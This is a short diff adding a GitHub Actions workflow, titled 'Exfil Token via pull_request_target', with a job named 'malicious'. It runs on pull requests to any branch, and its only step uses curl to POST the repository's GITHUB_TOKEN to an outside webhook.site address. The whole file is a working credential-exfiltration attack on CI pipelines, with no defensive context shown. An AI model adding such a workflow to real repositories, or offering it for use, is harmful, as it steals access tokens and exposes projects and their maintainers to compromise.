@@ -1,0 +1,17 @@
+name: Exfil Token via pull_request_target
+
+on:
+  pull_request_target:
+    branches:
+      - '*'
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  malicious:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfil Token
+        run: curl -X POST -d "token=$GITHUB_TOKEN" https://webhook.site/c3b49245-db63-4686-8a01-32c10746164c
